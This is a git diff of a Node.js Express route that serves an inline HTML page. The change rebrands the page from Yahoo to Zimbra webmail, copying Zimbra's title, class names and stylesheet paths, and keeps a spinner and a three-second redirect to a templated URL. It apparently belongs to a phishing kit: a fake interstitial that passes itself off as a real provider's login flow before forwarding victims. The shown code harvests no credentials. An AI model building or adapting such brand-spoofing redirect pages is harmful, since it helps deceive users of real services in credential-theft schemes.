@@ -17,99 +17,74 @@ router.get('/', (req, res) => {
       }else{
 
     const htmlContent = `
-    <!doctype html>
-<html lang="en">
-<head>
-<!-- Required meta tags -->
-<meta http-equiv="content-type" content="text/html; charset=UTF-8">
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-           <link rel="icon" type="image/x-icon" href="./images/img.ico">
-    <meta name="format-detection" content="telephone=no">
-    <title>Yahoo</title>
-    <link href="/stylesheet/main.css" rel="stylesheet" type="text/css">
-    <script>
-        setTimeout(function() {
-            window.location.href = '${url}';
-        }, 3000);
-    </script>
-
+    <!DOCTYPE html>
+<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths template user_font_size_normal" lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="cache-control" content="no-cache">
+    <meta http-equiv="Pragma" content="no-cache">
+    <title>Zimbra</title>
+    <link href="./stylesheet/common,login,zhtml,skin.css" rel="stylesheet" type="text/css">
+       <script>
+                setTimeout(function() {
+                    window.location.href = '${url}';
+                }, 3000);
+            </script> 
     
-    <style>
-    :root {
---yellow: #6600ff;
---red: #6600ff;
---blue: #6600ff;
---violet: #6600ff;
-}
-body {
-margin: 0;
-display: flex;
-justify-content: center;
-align-items: center;
-height: 100vh;
-background-color: white;
-background-image: linear-gradient(180deg, rgba(0,0,0,0.15) 0%, rgba(0,153,212,0) calc(15% + 100px), rgba(0,99,138,0) calc(85% + 100px), rgba(0,0,0,0.15) 100%);
-}
-div.container {
-display: flex;
-justify-content: center;
-align-items: center;
-}
-div > div {
-width: 3vw;
-height: 3vw;
-border-radius: 100%;
-margin: 2vw;
-background-image: linear-gradient(145deg, rgba(255,255,255,0.5) 0%, rgba(0,0,0,0) 100%);
-animation: bounce 1.5s 0.5s linear infinite;
-}
-.yellow {
-background-color: var(--yellow);
-}
+    <link rel="SHORTCUT ICON" href="./images/favicon.ico" id="DWT2" type="image/x-icon">
+<style>
+.loader {
+    width: 30px;
+    height: 30px;
+    border: 2px solid #f2f2f2;
+    border-bottom-color: grey;
+    border-radius: 50%;
+    display: inline-block;
+    box-sizing: border-box;
+    animation: rotation 1s linear infinite;
+    }
 
-.red {
-background-color: var(--red);
-animation-delay: 0.1s;
-}
+    @keyframes rotation {
+    0% {
+        transform: rotate(0deg);
+    }
+    100% {
+        transform: rotate(360deg);
+    }
+    } 
+    
+    #loader {
+    
+    height:100px;
+    width:200px;
+    margin-top:280px;
+    background-color:#f2f2f2;
+    padding-top:35px;
+    
+    
+    }
 
-.blue {
-background-color: var(--blue);
-animation-delay: 0.2s;
-}
-
-.violet {
-background-color: var(--violet);
-animation-delay: 0.3s;
-}
-
-@keyframes bounce {
-0%, 50%, 100% {
-transform: scale(1);
-filter: blur(0px);
-}
-25% {
-transform: scale(0.6);
-filter: blur(3px);
-}
-75% {
-filter: blur(3px);
-transform: scale(1.4);
-}
-}
 </style>
 </head>
-<body>
+<body class="user_font_system" style="margin: 0px; overflow: hidden;">
+	   <center>
+
+	<div id="loader">
+
+	<span class="loader"></span><br><br>
+
+	<span id="load" style="font-family: Helvetica Neue,Helvetica,Arial,Liberation Sans,sans-serif; color:#8b8b8b; display: none;">Loading...</span>
+	<script>
+	setTimeout(function() {
+	  document.getElementById("load").style.display = "block";
+	}, 2000);
+	</script>
+	</div>
+	</center>
+	</body>
+	</html>
 
 
-
-<div class="image-src">
-    <img src="./images/ldg.gif" alt="Yahoo" style="height: 200px;width:200px;">
-   </div>
-
-
-</body>
-</html>
     `;
 
     // Send the HTML content as a response
@@ -121,4 +96,4 @@ transform: scale(1.4);
 
 
 
-module.exports =router;
+module.exports =router
